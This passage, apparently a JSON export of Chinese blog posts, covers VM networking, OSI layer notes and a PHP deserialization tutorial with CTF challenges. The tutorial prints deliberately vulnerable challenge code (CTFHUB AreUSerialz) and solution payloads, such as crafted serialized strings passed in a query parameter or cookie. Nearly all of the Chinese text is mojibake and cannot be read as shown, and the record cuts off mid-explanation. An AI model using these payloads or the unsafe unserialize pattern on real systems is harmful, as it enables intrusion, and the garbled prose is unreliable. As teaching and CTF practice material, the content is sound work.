**ï¼šé€šè¿‡çœŸå®æœº ä¸Šç½‘ï¼Œå­˜åœ¨ä¸€ä¸ªåœ°å€è½¬æ¢ï¼Œåªè¦æ˜¯çœŸå®æœºæ‰€èƒ½è®¿é—®çš„æ‰€æœ‰ç½‘ç»œï¼Œè™šæ‹Ÿæœºå‡å¯ Host-Only ï¼šä»…ä¸»å¥æ¨¡å¼ï¼Œä»…ä»…èƒ½ä¸ çœŸå®æœº è¿›è¡Œé€šä¿¡ è¡¥å……ï¼š 169.254.X.X æ˜¯Windowsæ“ä½œç³»ç»Ÿåœ¨DHCPä¿¡æ¯ç§Ÿç”¨å¤±è´¥æ—¶è‡ªåŠ¨ç»™å®¢æˆ·æœºåˆ†é…çš„IPåœ°å€ã€‚ä½†æ˜¯æ˜¯æ— æ³•ä¸ç½‘å…³é€šä¿¡çš„ï¼Œä¹Ÿæ— æ³•æ¥å…¥Internetçš„æƒ…å†µã€‚ è™šæ‹Ÿæœºç½‘ç»œè®¾ç½® å‚è€ƒ","categories":[{"name":"è®¡ç½‘","slug":"è®¡ç½‘","permalink":"https://xizhi-future.github.io/categories/%E8%AE%A1%E7%BD%91/"}],"tags":[{"name":"è™šæ‹Ÿæœº","slug":"è™šæ‹Ÿæœº","permalink":"https://xizhi-future.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"}],"author":"xizhi-future"},{"title":"1.7 è®¡ç®—æœºç½‘ç»œçš„ä½“ç³»ç»“æ„","slug":"1.7-è®¡ç®—æœºç½‘ç»œçš„ä½“ç³»ç»“æ„","date":"2021-10-08T12:01:19.000Z","updated":"2021-10-08T12:02:38.238Z","comments":true,"path":"2021/10/08/1.7-è®¡ç®—æœºç½‘ç»œçš„ä½“ç³»ç»“æ„/","link":"","permalink":"https://xizhi-future.github.io/2021/10/08/1.7-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9A%84%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/","excerpt":"","text":"1.7 è®¡ç®—æœºç½‘ç»œçš„ä½“ç³»ç»“æ„ ISO å›½é™…æ ‡å‡†åŒ–ç»„ç»‡ OSI / RM äº’è¿ç½‘æ³•å¾‹ä¸Šçš„å›½é™…æ ‡å‡† TCP / IP å› ç‰¹ç½‘äº‹å®ä¸Šçš„å›½é™…æ ‡å‡† ç½‘ç»œåè®® Network Protocols æ•°æ®äº¤æ¢å­˜å¯¿çš„è§„åˆ™ã€æ ‡å‡†ä¸çº¦å®š ç½‘ç»œä½“ç³»ç»“æ„ è®¡ç®—æœºç½‘ç»œå„å±‚åŠå…¶åè®®çš„é›†åˆ 1.7.1 OSI ä¸ƒå±‚æ¨¡å‹å¼€æ”¾å¼ç³»ç»Ÿäº’è”é€šä¿¡å‚è€ƒæ¨¡å‹ï¼ˆè‹±è¯­ï¼šOpen System Interconnection Reference Modelï¼Œç¼©å†™ä¸º OSIï¼‰ï¼Œç®€ç§°ä¸º OSIæ¨¡å‹ï¼ˆOSI modelï¼‰ï¼Œä¸€ç§ æ¦‚å¿µæ¨¡å‹ï¼Œç”± å›½é™…æ ‡å‡†åŒ–ç»„ç»‡ æå‡ºï¼Œä¸€ä¸ªè¯•å›¾ä½¿å„ç§è®¡ç®—æœºåœ¨ä¸–ç•ŒèŒƒå›´å†…äº’è¿ä¸ºç½‘ç»œçš„æ ‡å‡†æ¡†æ¶ã€‚ åº”ç”¨å±‚ï¼šå¯ä»¥äº§ç”Ÿæµé‡ï¼Œå¯ä»¥ä¸ç”¨æˆ·è¿›è¡Œäº¤äº’çš„åº”ç”¨ç¨‹åº è¡¨ç¤ºå±‚ï¼šæ˜¯å¦åŠ å¯†ï¼Ÿ æ˜¯å¦å‹ç¼©ï¼Ÿ ç¼–ç é—®é¢˜ï¼Ÿ å¼€å‘äººå‘˜éœ€è¦è€ƒè™‘çš„é—®é¢˜ ä¼šè¯å±‚ï¼šæœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯å»ºç«‹çš„ä¼šè¯ å¯æŸ¥çœ‹æœ¨é©¬ï¼šnetstat -nb â€‹ ä¾‹å¦‚ï¼šè¿œç¨‹æ¡Œé¢å»ºç«‹ä¼šè¯ 192.168.158.1 è¿œç¨‹è¿æ¥ 192.168.158.115 å¯¹ 192.168.158.115 è¿›è¡Œç«¯å£æŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ° å­˜åœ¨è¿œç¨‹æ¡Œé¢çš„ä¼šè¯ netstat -an è¿›ä¸€æ­¥ è¿›è¡Œ â€œæœ¨é©¬â€ æŸ¥çœ‹ï¼š netstat -nb ä¾‹ï¼šå½“æƒ³æŸ¥çœ‹å½“å‰è®¡ç®—æœºä¸­æ˜¯å¦å­˜åœ¨æœ¨é©¬ï¼Œå¯ä»¥æ‰“å¼€ç”µè„‘ï¼Œä¸è¿›è¡Œä»»ä½•æ“ä½œï¼Œå³æ— æµé‡ä¼ è¾“ï¼Œå å‘½ä»¤ netstat -nb ï¼ŒæŸ¥çœ‹è¿›ç¨‹ã€‚ ä¼ è¾“å±‚ï¼šå¯é ä¼ è¾“ï¼ˆå»ºç«‹ä¼šè¯ï¼‰ï¼Œä¸å¯é ä¼ è¾“ï¼ˆä¸å»ºç«‹ä¼šè¯ï¼‰ï¼Œæµé‡æ§åˆ¶ ç½‘ç»œå±‚ï¼šIPåœ°å€ç¼–å€ï¼Œé€‰æ‹©æœ€ä½³è·¯å¾„ï¼ˆåŠ¨æ€è·¯ç”±åè®®ï¼‰ æ•°æ®é“¾è·¯å±‚ï¼šè§„å®šæ•°æ®å¦‚ä½•å°è£…ï¼Œæ·»åŠ ç‰©ç†å±‚åœ°å€ï¼ˆMAC åœ°å€ï¼‰ ç‰©ç†å±‚ï¼šç”µå‹ã€æ¥å£æ ‡å‡† åº”ç”¨ä¸¾ä¾‹ï¼š â€‹ ç½‘ç»œæ’é”™ï¼šåˆ†å±‚æ£€æŸ¥ï¼šä»æœ€åº•å±‚å¼€å§‹å‘ä¸Šé€ä¸€æ’æŸ¥ 1. ç½‘çº¿æ˜¯å¦æ’å¥½ï¼Ÿï¼ˆç‰©ç†å±‚ï¼‰ 2. IPåœ°å€ æ£€æŸ¥ ï¼ˆç½‘ç»œå±‚ï¼‰ 3. æµè§ˆå™¨ æ¶æ„æ’ä»¶ï¼Ÿï¼ˆåº”ç”¨å±‚ï¼‰ ç»ˆæï¼šé‡è£…ï¼Œé‡å¯ï¼Œæ ¼å¼åŒ– ç½‘ç»œå®‰å…¨ä¸ OSI å‚è€ƒæ¨¡å‹ ç‰©ç†å±‚å®‰å…¨ è®¾ç½® äº¤æ¢æœº æŸæ¥å£ç¦æ­¢ å¤–æ¥ç”¨æˆ· çš„è¿æ¥ æ•°æ®é“¾è·¯å±‚å®‰å…¨ ADSLã€APå¯†ç  ç½‘ç»œå±‚å®‰å…¨ è®¾ç½® è·¯ç”±å™¨ æŸæ¥å£ ç¦æ­¢å¤–æ¥ç”¨æˆ· çš„è¿æ¥ åº”ç”¨å±‚å®‰å…¨ SQLæ³¨å…¥ã€æ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶åŒ…å«ç­‰ç­‰ åº”ç”¨å±‚æ¼æ´ã€å„ç§æ”»å‡»æ‰‹æ®µç­‰ 1.7.2 TCP/IP å››å±‚æ¨¡å‹åº”ç”¨å±‚ ï¼ˆåŒ…æ‹¬äº† è¡¨ç¤ºå±‚ã€ä¼šè¯å±‚ï¼‰ ä¼ è¾“å±‚ ç½‘ç»œå±‚ **ç½‘ç»œæ¥å£å±‚ ** ï¼ˆåŒ…æ‹¬äº† æ•°æ®é“¾è·¯å±‚ã€ç‰©ç†å±‚ï¼‰ 1.7.3 äº”å±‚åè®® å¯¹åº” æ•°æ®å•å…ƒ ä»¥åŠ æ•°æ®ç®€å• è¿è¾“è¿‡ç¨‹åº”ç”¨å±‚ ä¼ è¾“æ•°æ®å•å…ƒï¼šPDU **ä¼ è¾“å±‚ ** è¿è¾“å±‚ æŠ¥æ–‡ åŠ  TCP/UDP ç½‘ç»œå±‚ IP æ•°æ®åŒ… ï¼ˆIP åˆ†ç»„ï¼‰ åŠ  IP åœ°å€ æ•°æ®é“¾è·¯å±‚ æ•°æ®å¸§ åŠ  MAC åœ°å€ï¼ŒåŠ å¸§å¤´å¸§å°¾ ç‰©ç†å±‚ æ¯”ç‰¹æµ bit (01æ„æˆ) 1.7.4 åŸºæœ¬æ¦‚å¿µå®ä½“ entity ï¼šäº¤æ¢ä¿¡æ¯æˆ–è½¯ä»¶è¿›ç¨‹ åè®® protocol ï¼šæ§åˆ¶ä¸¤ä¸ªå¯¹ç­‰å®ä½“é€šä¿¡çš„è§„åˆ™ æœåŠ¡ service ï¼šä¸‹å±‚å‘ä¸Šå±‚æä¾›æœåŠ¡ï¼Œä¸Šå±‚éœ€è¦ä½¿ç”¨ä¸‹å±‚æä¾›çš„æœåŠ¡æ¥å®ç°æœ¬å±‚çš„åŠŸèƒ½ æœåŠ¡è®¿é—®ç‚¹ SAP ï¼šç›¸é‚»ä¸¤å±‚å®ä½“ä¹‹é—´äº¤æ¢ä¿¡æ¯çš„åœ°æ–¹ 1.7.5 å®æ“æŸ¥çœ‹æœ¬åœ°ç½‘ç»œè¿æ¥ç½‘é€Ÿï¼š æµ‹è¯•ï¼šwindows 7 è‡ªåŠ¨åå•†æ˜¯æ ¹æ®åŒæ–¹é€Ÿç‡è¿›è¡Œè‡ªåŠ¨è®¾ç½®ï¼Œå¦‚æœå¼ºåˆ¶è®¾ç½®ä¸ºä¸å¦ä¸€æ–¹é€Ÿç‡ä¸åŒ¹é…çš„ç½‘é€Ÿï¼Œåˆ™æ— æ³•æ­£å¸¸è¿›è¡Œé€šä¿¡ã€‚","categories":[{"name":"è®¡ç½‘","slug":"è®¡ç½‘","permalink":"https://xizhi-future.github.io/categories/%E8%AE%A1%E7%BD%91/"}],"tags":[{"name":"è®¡ç½‘","slug":"è®¡ç½‘","permalink":"https://xizhi-future.github.io/tags/%E8%AE%A1%E7%BD%91/"}],"author":"xizhi-future"},{"title":"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–","slug":"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–","date":"2021-10-07T10:10:26.000Z","updated":"2021-10-07T10:11:19.031Z","comments":true,"path":"2021/10/07/åºåˆ—åŒ–ä¸ååºåˆ—åŒ–/","link":"","permalink":"https://xizhi-future.github.io/2021/10/07/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"[TOC] åºåˆ—åŒ–ä¸ååºåˆ—åŒ– åºåˆ—åŒ–ï¼šæŒä¹…ä¿å­˜ï¼Œç½‘ç»œä¼ è¾“ åºåˆ—åŒ–æ˜¯å°†å¯¹è±¡çŠ¶æ€è½¬æ¢ä¸ºå¯ä¿æŒæˆ–å¯ä¼ è¾“çš„æ ¼å¼çš„è¿‡ç¨‹ï¼ˆå¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼‰ã€‚ä¸åºåˆ—åŒ–ç›¸å¯¹çš„æ˜¯ååºåˆ—åŒ–ï¼Œå®ƒå°†æµè½¬æ¢ä¸ºå¯¹è±¡ï¼ˆå­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯¹è±¡ï¼‰ã€‚è¿™ä¸¤ä¸ªè¿‡ç¨‹ç»“åˆèµ·æ¥ï¼Œå¯ä»¥è½»æ¾åœ°å­˜å‚¨å’Œä¼ è¾“æ•°æ® æœ¬è´¨ä¸Šå°±æ˜¯å¯¹äºæ•°æ®æ ¼å¼çš„ä¸€ç§è½¬æ¢ å¸¸è§çš„åºåˆ—åŒ–æ ¼å¼ï¼š äºŒè¿›åˆ¶æ ¼å¼ å­—èŠ‚æ•°ç»„ json å­—ç¬¦ä¸² xml å­—ç¬¦ä¸² ç†è§£ï¼šåœ¨ç¨‹åºæ‰§è¡Œç»“æŸæ—¶ï¼Œå†…å­˜æ•°æ®ä¾¿ä¼šç«‹å³é”€æ¯ï¼Œå˜é‡æ‰€å‚¨å­˜çš„æ•°æ®ä¾¿æ˜¯å†…å­˜æ•°æ®ï¼Œè€Œæ–‡ä»¶ã€æ•°æ®åº“æ˜¯â€œæŒä¹…æ•°æ®â€ï¼Œå› æ­¤PHPåºåˆ—åŒ–å°±æ˜¯å°†å†…å­˜çš„å˜é‡æ•°æ®â€œä¿å­˜â€åˆ°æ–‡ä»¶ä¸­çš„æŒä¹…æ•°æ®çš„è¿‡ç¨‹ã€‚ ä¸€ã€ PHP ååºåˆ—åŒ–1.1 æ ¼å¼åŸç†ï¼šæœªå¯¹ç”¨æˆ·è¾“å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»è€Œå¯¼è‡´ä»£ç æ³¨å…¥ï¼ŒSQLæ³¨å…¥ç­‰å±å®³ã€‚ å½“è¿›è¡Œååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å°±ä¼šè‡ªåŠ¨è§¦å‘æŸäº›é­”æœ¯æ–¹æ³•ã€‚ æ¶‰åŠå‡½æ•°ï¼š 12serialize() //åºåˆ—åŒ–ï¼šå°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²unserialize() //ååºåˆ—åŒ–ï¼šå°†ä¸€ä¸ªå­—ç¬¦ä¸²è¿˜åŸä¸ºä¸€ä¸ªå¯¹è±¡ ç¤ºä¾‹ï¼š 12345678910111213141516&lt;?php$test = &quot;qww&quot;;//$test = 123;//$test = true;$test = serialize($test);echo $test;?&gt;//s:3:&quot;qww&quot;;//i:123; //b:1;&lt;?php$test = &#x27;s:3:&quot;qww&quot;;&#x27;;$test = unserialize($test);echo $test;?&gt;//qww 1234567&lt;?php$user=array(&#x27;xiao&#x27;,&#x27;shi&#x27;,&#x27;zi&#x27;);$user=serialize($user);echo $user;echo &quot;&lt;br /&gt;&quot;;print_r(unserialize($user));?&gt; æ ¼å¼ï¼š åºåˆ—åŒ–ä¸ååºåˆ—åŒ– å­—æ¯è¡¨ç¤ºï¼š a arrayæ•°ç»„ b booleanåˆ¤æ–­ç±»å‹ d doubleæµ®ç‚¹æ•° i integeræ•´æ•°å‹ o common object ä¸€èˆ¬çš„å¯¹è±¡ r referenceå¼•ç”¨ç±»å‹ s stringå­—ç¬¦ä¸²ç±»å‹ C custom object O class N null R pointer reference U unicode string 1.2 ç‰¹æ€§ æ‰€æœ‰ php ä¸­çš„å€¼éƒ½å¯ä»¥ä½¿ç”¨ serialize() æ¥è¿”å›ä¸€ä¸ªåŒ…å«å­—èŠ‚æµçš„å­—ç¬¦ä¸²è¡¨ç¤º åºåˆ—åŒ–ä¹‹åçš„å†…å®¹åªæœ‰æˆå‘˜å˜é‡ï¼Œæ²¡æœ‰æˆå‘˜å‡½æ•°ï¼Œå³æ–¹æ³• 12345678910&lt;?phpclass test&#123; public $a; public $b; function __construct()&#123;$this-&gt;a = &quot;xiaoshizi&quot;;$this-&gt;b=&quot;laoshizi&quot;;&#125; function happy()&#123;return $this-&gt;a;&#125;&#125;$a = new test();echo serialize($a);?&gt; ä¸‰ç§å˜é‡ç±»å‹çš„å·®å¼‚ï¼š å˜é‡å‰æ˜¯ protectedï¼Œåˆ™ä¼šåœ¨å˜é‡åå‰åŠ ä¸Š\\x00*\\x00 , private åˆ™ä¼šåœ¨å˜é‡åå‰åŠ ä¸Š\\x00ç±»å\\x00ï¼Œ\\x00å­—æ®µå\\x00ï¼Œè¾“å‡ºæ—¶ä¸€èˆ¬éœ€è¦urlç¼–ç ï¼Œè‹¥åœ¨æœ¬åœ°å­˜å‚¨æ¨èé‡‡ç”¨base64ç¼–ç çš„å½¢å¼ã€‚ public æ­£å¸¸è¾“å‡º Private æ‰€å£°æ˜çš„ç§æœ‰å˜é‡ åªèƒ½åœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»ä»¥åŠè¯¥ç±»çš„å¯¹è±¡ä¸­å‡ä¸å¯è§ã€‚æ‰€ä»¥ç§æœ‰å˜é‡åœ¨åºåˆ—åŒ–æ—¶ï¼Œç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Š %00 ï¼Œå³ ascii ä¸º0çš„å­—ç¬¦ï¼ˆä¸å¯è§å­—ç¬¦ï¼‰ï¼› Protected æ‰€å£°æ˜å—ä¿æŠ¤ç±»å‹çš„å˜é‡ åºåˆ—åŒ–æ—¶ä¼šæœ‰ %00*%00 å­—ç¬¦ï¼› æµ‹è¯•ä¸€ï¼špublic 12345678910&lt;?phpclass FileHandler &#123; public $op=&#x27;2&#x27;; public $filename=&#x27;flag.php&#x27;; public $content;&#125;$flag = new FileHandler();$flag_1 = (serialize($flag));echo $flag_1;?&gt; 12#è¿”å›O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:1:&quot;2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125; æµ‹è¯•äºŒï¼šprivate 12345678910&lt;?phpclass FileHandler &#123; private $op=&#x27;2&#x27;; private $filename=&#x27;flag.php&#x27;; private $content;&#125;$flag = new FileHandler();$flag_1 = (serialize($flag));echo $flag_1;?&gt; 12#è¿”å›O:11:&quot;FileHandler&quot;:3:&#123;s:15:&quot;FileHandlerop&quot;;s:1:&quot;2&quot;;s:21:&quot;FileHandlerfilename&quot;;s:8:&quot;flag.php&quot;;s:20:&quot;FileHandlercontent&quot;;N;&#125; 12#å®é™…ä¸Šæ˜¯O:11:&quot;FileHandler&quot;:3:&#123;s:15:&quot;%00FileHandler%00op&quot;;s:1:&quot;2&quot;;s:21:&quot;%00FileHandler%00filename&quot;;s:8:&quot;flag.php&quot;;s:20:&quot;%00FileHandler%00content&quot;;N;&#125; æµ‹è¯•ä¸‰ï¼šprotected 12345678910&lt;?phpclass FileHandler &#123; protected $op=&#x27;2&#x27;; protected $filename=&#x27;flag.php&#x27;; protected $content;&#125;$flag = new FileHandler();$flag_1 = (serialize($flag));echo $flag_1;?&gt; 12#è¿”å›O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;s:1:&quot;2&quot;;s:11:&quot;*filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;*content&quot;;N;&#125; å®é™…ä¸Šæ˜¯è¾“å‡ºå¯¼è‡´äº†ä¸å¯è§å­—ç¬¦ \\x00 çš„ä¸¢å¤± 12#å®é™…ä¸Šæ˜¯O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;%00*%00op&quot;;s:1:&quot;2&quot;;s:11:&quot;%00*%00filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;%00*%00content&quot;;N;&#125; 1.3 php ååºåˆ—åŒ–çš„è§¦å‘è§¦å‘æ¡ä»¶ï¼š unserialize() å‡½æ•° çš„å˜é‡å¯æ§ï¼Œæ–‡ä»¶å½“ä¸­å­˜åœ¨å¯åˆ©ç”¨çš„ç±»ï¼Œç±»ä¸­å­˜åœ¨é­”æœ¯æ–¹æ³• å¸¸è§é­”æœ¯æ–¹æ³•ï¼šé­”æœ¯æ–¹æ³•å°±æ˜¯ php åœ¨è¿›è¡Œæœ‰å…³ç±»ä¸­å˜é‡åºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–ç›¸å…³æ“ä½œæ˜¯ä¼šè‡ªåŠ¨è¢«è°ƒç”¨çš„ä¸€äº›æ–¹æ³•ï¼ˆå‡½æ•°ï¼‰ 123456789101112__wakeup() //ä½¿ç”¨unserializeæ—¶è§¦å‘ __sleep() //ä½¿ç”¨serializeæ—¶è§¦å‘ __destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘â€”â€”å¯¹è±¡è°ƒç”¨ä¸€ä¸ªæ²¡æœ‰å£°æ˜çš„æ–¹æ³•æ—¶ï¼Œè§¦å‘ __callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ __get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ® __set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§ __isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘ __unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘__toString() //æŠŠ ä¸€ä¸ªå¯¹è±¡ å½“ä½œ å­—ç¬¦ä¸² ä½¿ç”¨æ—¶è§¦å‘ //ä¾‹å¦‚ï¼šecho å¯¹è±¡; $text=$test+$å¯¹è±¡ï¼› __invoke() //å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œè¯¥æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ å…¶å®ƒé­”æœ¯æ–¹æ³• ç†è§£é­”æœ¯æ–¹æ³•çš„è°ƒç”¨ï¼š 1234567891011121314151617181920212223242526272829303132&lt;?phpclass test&#123; public $varr1=&quot;abc&quot;; public $varr2=&quot;123&quot;; public function echoP()&#123; echo $this-&gt;varr1.&quot;&lt;br&gt;&quot;; &#125; public function __construct()&#123; echo &quot;__construct&lt;br&gt;&quot;; &#125; public function __destruct()&#123; echo &quot;__destruct&lt;br&gt;&quot;; &#125; public function __toString()&#123; return &quot;__toString&lt;br&gt;&quot;; &#125; public function __sleep()&#123; echo &quot;__sleep&lt;br&gt;&quot;; return array(&#x27;varr1&#x27;,&#x27;varr2&#x27;); &#125; public function __wakeup()&#123; echo &quot;__wakeup&lt;br&gt;&quot;; &#125;&#125;$obj = new test(); //å®ä¾‹åŒ–å¯¹è±¡ï¼Œè°ƒç”¨__construct()æ–¹æ³•ï¼Œè¾“å‡º__construct$obj-&gt;echoP(); //è°ƒç”¨echoP()æ–¹æ³•ï¼Œè¾“å‡º&quot;abc&quot;echo $obj; //objå¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²è¾“å‡ºï¼Œè°ƒç”¨__toString()æ–¹æ³•ï¼Œè¾“å‡º__toString$s =serialize($obj); //objå¯¹è±¡è¢«åºåˆ—åŒ–ï¼Œè°ƒç”¨__sleep()æ–¹æ³•ï¼Œè¾“å‡º__sleepecho unserialize($s); //$sé¦–å…ˆä¼šè¢«ååºåˆ—åŒ–ï¼Œä¼šè°ƒç”¨__wake()æ–¹æ³•ï¼Œè¢«ååºåˆ—åŒ–å‡ºæ¥çš„å¯¹è±¡åˆè¢«å½“åšå­—ç¬¦ä¸²ï¼Œå°±ä¼šè°ƒç”¨_toString()æ–¹æ³•ã€‚// è„šæœ¬ç»“æŸåˆä¼šè°ƒç”¨__destruct()æ–¹æ³•ï¼Œè¾“å‡º__destruct?&gt; 1.4 æ— ç±»ç®€å•é¢˜ç›®1234567891011&lt;?php error_reporting(0); include &quot;flag.php&quot;; $str = &quot;Love&quot;; $str1 = $_GET[&#x27;str1&#x27;]; if(unserialize($str1) === $str)&#123; echo $flag; &#125; show_source(__FILE__);?&gt;//WP:?str1=s:4:&quot;Love&quot;; 12345678910111213141516171819202122232425262728293031323334353637 &lt;?phperror_reporting(0);include_once(&quot;flag.php&quot;);$cookie = $_COOKIE[&#x27;ISecer&#x27;];if(isset($_GET[&#x27;hint&#x27;]))&#123; show_source(__FILE__);&#125;else if(unserialize($cookie) === &quot;$KEY&quot;)&#123; echo &quot;$flag&quot;;&#125;else &#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;&lt;title&gt;Login&lt;/title&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt; &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt; &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php&#125;$KEY=&#x27;ISecer:www.isecer.com&#x27;;?&gt; //WP:cookie:ISecer=s:0:&quot;&quot;; //é¡ºåºé—®é¢˜ 1.5 æœ‰ç±»ç®€å•é¢˜ç›®è§¦å‘é­”æœ¯æ–¹æ³• 12345678910111213__construct //åˆ›å»ºå¯¹è±¡æ—¶è§¦å‘__destruct //å¯¹è±¡è¢«é”€æ¯æ—¶ è§¦å‘ ä½¿ç”¨unserializeæ—¶è§¦å‘__toString //echo æˆ–è€… æ‹¼æ¥å­—ç¬¦ä¸²æˆ–è€…å…¶å®ƒéšå¼è°ƒç”¨è¯¥æ–¹æ³•çš„æ“ä½œéƒ½ä¼šè¢«è§¦å‘__wakeup() //ä½¿ç”¨unserializeæ—¶è§¦å‘ __sleep() //ä½¿ç”¨serializeæ—¶è§¦å‘ __call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘â€”â€”å¯¹è±¡è°ƒç”¨ä¸€ä¸ªæ²¡æœ‰å£°æ˜çš„æ–¹æ³•æ—¶ï¼Œè§¦å‘ __callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ __get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ® __set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§ __isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘ __unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘ echo å¯¹è±¡; $text=$test+$å¯¹è±¡ï¼› __invoke() //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ é­”æœ¯æ–¹æ³•å‚è€ƒï¼šhttps://www.cnblogs.com/20175211lyz/p/11403397.html 1.5 CTF é¢˜ç›®1.5.1 CTFHUB AreUSerialz12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667 &lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;//ä¼ å‚if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; 12345678910è§£é‡Šï¼š1.?strä¼ å‚ï¼Œç»•è¿‡is_valid() ä¹‹åï¼Œè¿›è¡Œååºåˆ—åŒ–unserialize($str)ï¼Œ ä¼ å…¥ç±»å¯¹è±¡çš„åºåˆ—åŒ–å€¼ï¼Œå°†ä¼šè§¦å‘ __construct() ï¼Œæœ€åé”€æ¯å¯¹è±¡æ—¶ï¼Œä¼šè§¦å‘ __destruct()2. __construct() å¯¹å˜é‡åˆå§‹åŒ–æ“ä½œ3. __destruct() 